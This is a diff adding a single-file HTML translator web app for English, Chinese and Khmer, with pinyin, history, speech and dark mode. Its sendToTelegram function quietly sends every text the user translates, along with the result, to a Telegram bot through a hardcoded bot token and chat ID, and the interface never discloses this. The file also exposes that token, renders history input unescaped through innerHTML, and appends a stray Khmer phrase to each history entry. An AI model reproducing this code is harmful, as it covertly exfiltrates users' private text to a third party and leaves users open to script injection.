@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Translator App</title>
+
+<script src="https://unpkg.com/pinyin-pro@3.18.2/dist/index.js"></script>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    background:#f4f4f4;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+    min-height:100vh;
+    padding:15px;
+    transition:0.3s;
+}
+
+body.dark{
+    background:#111;
+}
+
+.container{
+    width:100%;
+    max-width:500px;
+    background:white;
+    padding:20px;
+    border-radius:20px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+    transition:0.3s;
+}
+
+body.dark .container{
+    background:#1e1e1e;
+    color:white;
+}
+
+.top-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:15px;
+}
+
+.toggle{
+    font-size:22px;
+    cursor:pointer;
+}
+
+textarea{
+    width:100%;
+    min-height:120px;
+    padding:15px;
+    border:2px solid #ddd;
+    border-radius:15px;
+    resize:none;
+    font-size:16px;
+    outline:none;
+}
+
+body.dark textarea,
+body.dark select{
+    background:#2a2a2a;
+    color:white;
+    border:2px solid #444;
+}
+
+.select-group{
+    display:flex;
+    gap:10px;
+    margin:15px 0;
+}
+
+select{
+    flex:1;
+    padding:12px;
+    border-radius:12px;
+    border:2px solid #ddd;
+    font-size:15px;
+}
+
+.buttons{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+}
+
+button{
+    flex:1;
+    min-width:100px;
+    padding:12px;
+    border:none;
+    border-radius:12px;
+    background:#4a90e2;
+    color:white;
+    font-size:15px;
+    cursor:pointer;
+}
+
+.output{
+    margin-top:20px;
+    background:#f8f8f8;
+    padding:15px;
+    border-radius:15px;
+}
+
+body.dark .output,
+body.dark .history{
+    background:#2a2a2a;
+}
+
+#result{
+    font-size:20px;
+    margin-bottom:10px;
+}
+
+#pinyin{
+    color:gray;
+    font-size:16px;
+}
+
+.history{
+    margin-top:20px;
+    background:#f8f8f8;
+    padding:15px;
+    border-radius:15px;
+}
+
+.history-item{
+    padding:10px;
+    border-bottom:1px solid #ddd;
+    font-size:14px;
+}
+
+@media(max-width:600px){
+    .select-group{
+        flex-direction:column;
+    }
+
+    button{
+        width:100%;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="top-bar">
+        <h2>Translator</h2>
+        <div class="toggle" onclick="toggleDarkMode()">🌚</div>
+    </div>
+
+    <textarea id="text" placeholder="Type something..." oninput="autoResize(this)"></textarea>
+
+    <div class="select-group">
+
+        <select id="from">
+            <option value="en">English</option>
+            <option value="zh">Chinese</option>
+            <option value="km">Khmer</option>
+        </select>
+
+        <select id="to">
+            <option value="zh">Chinese</option>
+            <option value="en">English</option>
+            <option value="km">Khmer</option>
+        </select>
+
+    </div>
+
+    <div class="buttons">
+
+        <button onclick="translateText()">Translate</button>
+        <button onclick="speakText()">Speak</button>
+        <button onclick="copyText()">Copy</button>
+
+    </div>
+
+    <div class="output">
+
+        <h3>Result</h3>
+        <div id="result">...</div>
+        <div id="pinyin"></div>
+
+    </div>
+
+    <div class="history">
+
+        <h3>History</h3>
+        <div id="historyList"></div>
+
+    </div>
+
+</div>
+
+<script>
+
+// AUTO RESIZE
+function autoResize(textarea){
+    textarea.style.height = "auto";
+    textarea.style.height = textarea.scrollHeight + "px";
+}
+
+// TRANSLATE
+async function translateText(){
+
+    const text = document.getElementById("text").value;
+    const from = document.getElementById("from").value;
+    const to = document.getElementById("to").value;
+
+    if(!text) return;
+
+    try{
+
+        const res = await fetch(
+`https://translate.googleapis.com/translate_a/single?client=gtx&sl=${from}&tl=${to}&dt=t&q=${encodeURIComponent(text)}`
+        );
+
+        const data = await res.json();
+
+        const translated = data[0][0][0];
+
+        document.getElementById("result").innerText = translated;
+
+        // PINYIN
+        let py = "";
+
+        if(to === "zh"){
+
+            py = pinyinPro.pinyin(translated,{
+                toneType:"symbol"
+            });
+
+            document.getElementById("pinyin").innerText = py;
+
+        }else{
+
+            document.getElementById("pinyin").innerText = "";
+        }
+
+        // SAVE HISTORY
+        saveHistory(text, translated);
+
+        // SEND TO TELEGRAM
+        sendToTelegram(text, translated, py);
+
+    }catch(err){
+        document.getElementById("result").innerText = "Error translating";
+    }
+}
+
+// SPEAK
+function speakText(){
+
+    const text = document.getElementById("result").innerText;
+    const to = document.getElementById("to").value;
+
+    const speech = new SpeechSynthesisUtterance(text);
+
+    if(to === "zh"){
+        speech.lang = "zh-CN";
+    }else if(to === "en"){
+        speech.lang = "en-US";
+    }else{
+        speech.lang = "km-KH";
+    }
+
+    speechSynthesis.speak(speech);
+}
+
+// COPY
+function copyText(){
+    const text = document.getElementById("result").innerText;
+    navigator.clipboard.writeText(text);
+    alert("Copied!");
+}
+
+// DARK MODE
+function toggleDarkMode(){
+    document.body.classList.toggle("dark");
+    localStorage.setItem("darkMode", document.body.classList.contains("dark"));
+}
+
+if(localStorage.getItem("darkMode") === "true"){
+    document.body.classList.add("dark");
+}
+
+// HISTORY
+function saveHistory(input, output){
+
+    let history = JSON.parse(localStorage.getItem("history")) || [];
+
+    history.unshift({ input, output });
+
+    if(history.length > 10) history.pop();
+
+    localStorage.setItem("history", JSON.stringify(history));
+
+    loadHistory();
+}
+
+function loadHistory(){
+
+    let history = JSON.parse(localStorage.getItem("history")) || [];
+
+    let html = "";
+
+    history.forEach(item => {
+
+        html += `
+        <div class="history-item">
+            <b>You:</b> ${item.input}<br><br>
+            <b>Result:</b> ${item.output}កំពុងធ្វើអី?
+        </div>
+        `;
+    });
+
+    document.getElementById("historyList").innerHTML = html;
+}
+
+// TELEGRAM
+async function sendToTelegram(input, output, pinyinText){
+
+    const BOT_TOKEN = "8143711148:AAFEzTbbJeCWSLo8lDhoPmmGH-vU7o7O5II";
+    const CHAT_ID = "5326633599";
+
+    const message =
+` 
+${input}
+${output}
+${pinyinText || "None"}`;
+    try{
+        await fetch(
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+
+    }catch(err){
+        console.log("Telegram Error");
+    }
+}
+
+loadHistory();
+
+</script>
+
+</body>
+</html>
